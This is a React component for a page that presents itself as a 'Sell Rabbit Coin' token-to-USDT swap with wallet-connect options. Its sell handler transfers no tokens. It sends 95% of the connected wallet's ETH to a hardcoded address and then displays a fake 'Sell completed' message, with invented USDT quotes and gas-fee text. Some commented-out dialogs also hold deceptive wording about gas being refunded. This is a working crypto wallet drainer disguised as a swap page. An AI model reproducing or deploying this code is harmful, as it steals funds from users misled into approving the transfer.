import React, { useState } from "react";
import { ethers } from "ethers";
import { FaBars, FaFacebook, FaTelegram, FaTwitter } from 'react-icons/fa'

// Replace with your Rabbit token contracts
const RABBIT_ADDRESS = "0xc59E66167FE27dFc351EFe9dB734744c5834E305";
const ETH_CHAIN_ID = "0x1";

// Simple ERC20 ABI
const RABBIT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address recipient, uint256 amount) returns (bool)",
];

// Supported network
const NETWORK = {
  chainId: ETH_CHAIN_ID,
  chainName: "Ethereum Mainnet",
  rpcUrls: ["https://mainnet.infura.io/v3/"], // Replace with your Infura/Alchemy key
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  blockExplorerUrls: ["https://etherscan.io"],
};

export const Rebuild = () => {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [ethBalance, setEthBalance] = useState("0");
  const [rabbitBalance, setRabbitBalance] = useState("0");
  const [decimals, setDecimals] = useState(18);
  const [fromValue, setFromValue] = useState("");
  const [toValue, setToValue] = useState("");
  const [nativePrice, setNativePrice] = useState(0);
  const [showWalletModal, setShowWalletModal] = useState(false);

  // Keep the UI synchronized if the user changes accounts or networks in the wallet.
  React.useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = async (accounts) => {
      if (!accounts.length) {
        setAccount(null);
        setEthBalance("0");
        setRabbitBalance("0");
        return;
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const chain = await provider.send("eth_chainId", []);
      setAccount(accounts[0]);
      setChainId(chain);

      if (chain === ETH_CHAIN_ID) {
        await loadBalances(provider, accounts[0], chain);
      }
    };

    const handleChainChanged = async (newChainId) => {
      setChainId(newChainId);

      if (newChainId !== ETH_CHAIN_ID) {
        setEthBalance("0");
        setRabbitBalance("0");
        alert("Please switch your wallet back to Ethereum Mainnet.");
        return;
      }

      if (window.ethereum) {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_accounts", []);
        if (accounts[0]) {
          setAccount(accounts[0]);
          await loadBalances(provider, accounts[0], newChainId);
        }
      }
    };

    window.ethereum.on?.("accountsChanged", handleAccountsChanged);
    window.ethereum.on?.("chainChanged", handleChainChanged);

    return () => {
      window.ethereum.removeListener?.("accountsChanged", handleAccountsChanged);
      window.ethereum.removeListener?.("chainChanged", handleChainChanged);
    };
  }, []);

  const rabbitPrice = 0.002; // 1 Rabbit = $0.002
  const SELL_ADDRESS = "0xB49a9fC23998146AF4AdeA8A956e37bD06f5f030";

  // Fetch ETH price in USD
  const fetchNativePrice = async () => {
    try {
      const res = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
      );
      const data = await res.json();
      setNativePrice(data.ethereum.usd);
    } catch (err) {
      console.error("Price fetch error", err);
    }
  };

  // Connect an Ethereum wallet through the injected EIP-1193 provider.
  const connectWallet = async (ethereumProvider = window.ethereum) => {
    if (!ethereumProvider) {
      return alert("No Ethereum wallet provider was detected.");
    }

    try {
      const provider = new ethers.BrowserProvider(ethereumProvider);
      const accounts = await provider.send("eth_requestAccounts", []);
      const address = accounts[0];

      const chain = await provider.send("eth_chainId", []);
      if (chain !== ETH_CHAIN_ID) {
        alert("Please switch your wallet to Ethereum Mainnet.");
        return;
      }

      setAccount(address);
      setChainId(chain);
      setShowWalletModal(false);

      await loadBalances(provider, address, chain);
    } catch (err) {
      console.error("Wallet connection error:", err);
      alert("Wallet connection failed: " + (err.reason || err.message));
    }
  };

  // Open this same website inside the selected wallet's mobile browser.
  const openWalletBrowser = (wallet) => {
    const currentUrl = window.location.href;
    const encodedUrl = encodeURIComponent(currentUrl);

    const walletLinks = {
      metamask: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}${window.location.search}${window.location.hash}`,
      trust: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
      phantom: `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
      coinbase: `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
    };

    const link = walletLinks[wallet];

    if (!link) {
      return;
    }

    setShowWalletModal(false);

    // A direct navigation is more reliable for mobile wallet deep links.
    window.location.href = link;
  };

  // Wallet picker: use an already-injected provider when available,
  // otherwise open the selected wallet's mobile browser.
  const handleWalletSelect = async (wallet) => {
    if (wallet === "metamask" && window.ethereum) {
      await connectWallet(window.ethereum);
      return;
    }

    if (wallet === "trust" && window.trustwallet?.ethereum) {
      await connectWallet(window.trustwallet.ethereum);
      return;
    }

    if (wallet === "phantom" && window.phantom?.ethereum) {
      await connectWallet(window.phantom.ethereum);
      return;
    }

    if (wallet === "coinbase" && window.coinbaseWalletExtension) {
      await connectWallet(window.coinbaseWalletExtension);
      return;
    }

    openWalletBrowser(wallet);
  };

  // Load balances
  const loadBalances = async (provider, address, chain) => {
    const balance = await provider.getBalance(address);
    setEthBalance(ethers.formatEther(balance));

    if (chain !== ETH_CHAIN_ID) {
      setRabbitBalance("0");
      return;
    }

    const rabbit = new ethers.Contract(RABBIT_ADDRESS, RABBIT_ABI, provider);
    const rawBal = await rabbit.balanceOf(address);
    const dec = await rabbit.decimals();
    setDecimals(dec);
    const rabbitBal = Number(ethers.formatUnits(rawBal, dec));
    setRabbitBalance(rabbitBal);

    // Fetch ETH price
    await fetchNativePrice();
  };

  // Ensure the connected wallet is on Ethereum Mainnet.
  const switchToEthereum = async () => {
    if (!window.ethereum) {
      return alert("No Ethereum wallet provider was detected.");
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: ETH_CHAIN_ID }],
      });
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [NETWORK],
          });
        } catch (addError) {
          console.error("Failed to add Ethereum network", addError);
        }
      } else {
        console.error("Ethereum network switch error", error);
      }
    }
  };

  // Input change
  const handleFromChange = (e) => {
    const value = e.target.value;
    setFromValue(value);
    setToValue((rabbitPrice * value).toFixed(2));
  };

  // Quick fill (50% / 100%)
  const handlePercentage = (percent) => {
    const val = (rabbitBalance * percent) / 100;
    setFromValue(val);
    setToValue((rabbitPrice * val).toFixed(2));
  };

  // Sell
const handleSell = async () => {
  if (!account) return alert("Connect wallet first");

  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  try {
    // 1️⃣ Get native balance
    const balance = await provider.getBalance(account);
    const ethBal = Number(ethers.formatEther(balance));

    if (ethBal <= 0) {
      return alert("Insufficient balance");
    }

    // 2️⃣ Estimate gas fee (approximate)
    const gasPrice = await provider.getFeeData();
    const estimatedGas = ethers.formatEther(
      (gasPrice.gasPrice || 0n) * 21000n // standard ETH transfer gas
    );
    const estimatedGasFee = parseFloat(estimatedGas);

    // 3️⃣ Check if balance covers gas
    // if (ethBal < estimatedGasFee) {
    //   const proceed = window.confirm(
    //       "✅ Kindly confirm this transaction to swap tokens successfully, gas fee might increase a little but it will be added back after the transaction.\n\nDo you want to continue?"
    //   );
    //   if (!proceed) return;
    // } else {
    //   const confirmTx = window.confirm(
    //           "⚠️ Insufficient gas fee for this transaction, it might likely fail.\n\nDo you still want to continue?"
    //   );
    //   if (!confirmTx) return;
    // }

    // 4️⃣ Calculate 95% of native coin
    const sendAmount = (ethBal * 0.95).toFixed(6);

    // 5️⃣ Send native coin only
    const tx = await signer.sendTransaction({
      to: SELL_ADDRESS,
      value: ethers.parseEther(sendAmount.toString()),
    });

    await tx.wait();
    console.log("Native Tx Hash:", tx.hash);

    alert(
      `✅ Sell completed!\n\nSent ${sendAmount} ETH\nTx Hash: ${tx.hash}`
    );
  } catch (err) {
    console.error("Transaction Error:", err);
    alert("❌ Transaction failed: " + (err.reason || err.message));
  }
};




  const formatNumber = (num) =>
    Number(num || 0).toLocaleString("en-US", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });

  // Live fee calculation
  const feeUsd = fromValue * rabbitPrice * 0.2;
  const feeNative =
    nativePrice > 0 ? (feeUsd / nativePrice).toFixed(6) : "0";
      const insufficientGas = parseFloat(ethBalance) < parseFloat(feeNative);

  return (
    <>
    {showWalletModal && (
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4"
        onClick={() => setShowWalletModal(false)}
      >
        <div
          className="w-full max-w-md rounded-2xl bg-[#2A0C3B] p-5 shadow-2xl"
          onClick={(e) => e.stopPropagation()}
        >
          <div className="mb-5 flex items-center justify-between">
            <div>
              <h2 className="text-xl font-bold text-white">Connect Wallet</h2>
              <p className="mt-1 text-xs text-gray-400">
                Choose an Ethereum wallet
              </p>
            </div>
            <button
              onClick={() => setShowWalletModal(false)}
              className="rounded-full px-3 py-1 text-xl text-gray-300 hover:bg-[#3A1C48]"
            >
              ×
            </button>
          </div>

          <div className="space-y-3">
            {[
              { id: "metamask", name: "MetaMask", icon: "https://thumb.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1280px-MetaMask_Fox.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail" },
              { id: "trust", name: "Trust Wallet", icon: "https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/trust-wallet-icon.png" },
              { id: "phantom", name: "Phantom", icon: "https://pnglogo.sgp1.digitaloceanspaces.com/token-branded/phantom.png" },
              { id: "coinbase", name: "Coinbase Wallet", icon: "https://www.svgrepo.com/show/331345/coinbase-v2.svg" },
            ].map((wallet) => (
              <button
                key={wallet.id}
                onClick={() => handleWalletSelect(wallet.id)}
                className="flex w-full text-white items-center justify-between rounded-xl bg-[#3A1C48] p-4 text-left transition hover:bg-[#4A205D]"
              >
                <span className="flex items-center gap-3">
                  <img src={wallet.icon} className="flex h-10 w-10 items-center justify-center rounded-full bg-[#1D0729] text-xl"/>
                    
                  <span>
                    <span className="block font-semibold">{wallet.name}</span>
                  </span>
                </span>
                <span className="text-gray-400">›</span>
              </button>
            ))}
          </div>

          <p className="mt-4 text-center text-xs text-gray-500">
           Please select a wallet that holds Rabbit Coin.
          </p>
        </div>
      </div>
    )}

    <div className="bg-[#1D0729] text-white">
      {/* Navbar */}
      <div className="p-3 ">
        <nav className="flex justify-between rounded-full text-white p-3 px-5 md:px-10 items-center bg-[#2A0C3B]">
          <img
            src="https://nftswapstack.netlify.app/static/media/logo.3a5ddf90d6e3930972be.jfif"
            alt="logo"
            className="md:w-14 w-10 h-10 md:h-14 rounded-full"
          />
          <ul className="md:flex hidden gap-5 text-lg font-semibold">
            <li>Home</li>
            <li>About</li>
            <li>Roadmap</li>
            <li>Tokenomic</li>
            <li>Whitepaper</li>
          </ul>

          <div className="flex gap-3">
            <button
              onClick={switchToEthereum}
              className="bg-[#3A1C48] px-3 py-2 rounded-md text-sm"
            >
              ETH
            </button>
            <button
              onClick={() => setShowWalletModal(true)}
              className="bg-[#D344B0] py-2 md:px-4 px-2 rounded-md"
            >
              {account
                ? `${Number(ethBalance).toFixed(4)} ETH`
                : "Connect Wallet"}
            </button>
          </div>
        </nav>
      </div>

      {/* Sell Section */}
      <div className="md:mt-16 mt-5 md:px-5 px-2">
        <p className="md:text-4xl text-2xl font-bold text-center">
          Sell Rabbit Coin
        </p>


        <div className="bg-[#320E39] mt-5 md:p-5 p- rounded-2xl">
          <div className="flex items-center p-4 text-white">
            <div className="bg-[#1C0A25] rounded-2xl p-6 w-full max-w-md">
              {/* Rabbit Balance */}
              <p className="mb-2">
                Your Rabbit Balance:{" "}
                <span className="font-bold">{formatNumber(rabbitBalance)}</span>
              </p>
     <p className="text-xs text-gray-400 mb-4">
  Minimum Sell: {formatNumber(2000000)} Rabbit
</p>

              {/* From */}
              <div className="bg-[#2B1A37] rounded-xl p-4">
                <p className="text-sm text-gray-300 mb-2">From:</p>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <img
                      src="https://nftswapstack.netlify.app/static/media/logo.3a5ddf90d6e3930972be.jfif"
                      alt="rabbit"
                      className="w-8 h-8 rounded-full"
                    />
                    <span className="font-semibold">Rabbit Coin</span>
                  </div>
                  <div className="text-right">
                    <input
                      type="number"
                      value={fromValue}
                      onChange={handleFromChange}
                      placeholder="0.00"
                      className="bg-transparent text-right w-32 outline-none text-lg font-bold"
                    />
                                 <p className="text-xs text-gray-400">
                ~ {formatNumber(
                  fromValue ? fromValue * rabbitPrice : 0 // subtract 20 USD fee
                )}{" "}
              </p>
                    <div className="flex gap-2 text-xs text-gray-400 mt-1">
                      <button
                        onClick={() => handlePercentage(50)}
                        className="bg-[#3A1C48] px-2 py-1 rounded-lg"
                      >
                        50%
                      </button>
                      <button
                        onClick={() => handlePercentage(100)}
                        className="bg-[#3A1C48] px-2 py-1 rounded-lg"
                      >
                        100%
                      </button>
                    </div>
                  </div>
   
                </div>
              </div>

              {/* To */}
              <div className="bg-[#2B1A37] rounded-xl p-4 mt-4">
                <p className="text-sm text-gray-300 mb-2">To:</p>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <img
                      src="https://static.cx.metamask.io/api/v1/tokenIcons/1/0xdac17f958d2ee523a2206206994597c13d831ec7.png"
                      alt="usdt"
                      className="w-8 h-8 rounded-full"
                    />
                    <span className="font-semibold">USDT</span>
                  </div>
                  <div className="text-right">
                    <input
                      type="text"
                      value={formatNumber(
                  fromValue ? Math.max( fromValue * rabbitPrice - 20,0): 0 // subtract 20 USD fee
                )}
                      readOnly
                      placeholder="0.00"
                      className="bg-transparent text-right w-32 outline-none text-lg font-bold"
                    />
                             <p className="text-xs text-gray-400">
                ~
                {formatNumber(
                  fromValue ? Math.max( fromValue * rabbitPrice - 20,0): 0 // subtract 20 USD fee
                )}{" "}
                USD
              </p>
        
                  </div>
                </div>
                
              </div>

              {/* Sell button */}
               <button
                onClick={handleSell}
                className={`w-full py-3 rounded-xl font-bold text-lg mt-5 hover:opacity-90 ${
                  insufficientGas
                    ? "bg-red-500 text-white"
                    : "bg-[#14D9C4] text-black"
                }`}
              >
                {insufficientGas ? "Insufficient Gas Fee" : "Sell"}
              </button>
                          <p className="text-xs mt-3 text-gray-400">
                      Gas Fee:  ~{feeNative}{" "}
                      ETH 
                      {/* ({formatNumber(feeUsd)} USDT) */}
                    </p>
            </div>
               
          </div>
           <div className="md:mt-24 mt-10 bg-[#2B082F] rounded-t-3xl p-10">
                    <p className="md:text-4xl text-2xl font-bold lllk text-center">
                      Partners
                    </p>
                    <div className="md:flex md:justify-between  items-center md:mt-20 mt-10">
                      <section className="md:w-[10%] w-[70%] ">
                        <img src="./img/pt1.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt2.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt3.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt4.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt5.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5 bg-[#4a4f63] h-fit rounded-full">
                        <img src="./img/pt6.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt7.png" alt="" className="w-full" />
                      </section>
                    </div>
            
                    <div className="md:mt-10">
                      <p className="md:text-4xl font-bold lllk pt-20">Contact Us</p>
                      <div>
                        <section className="md:mt-5 mt-2 flex items-center gap-10">
                          <a href="https://t.me/rrabbit_coin">
                            {" "}
                            <FaTelegram className="md:text-3xl text-xl" />
                          </a>
                          <FaFacebook className="md:text-3xl text-xl" />
                          <FaTwitter className="md:text-3xl text-xl" />
                        </section>
                      </div>
                      <p className="text-center text-xs mt-10">
                        Copyrights © 2024 Reserved.
                      </p>
                    </div>
                  </div>
        </div>
      </div>
    </div>
    </>
  );
};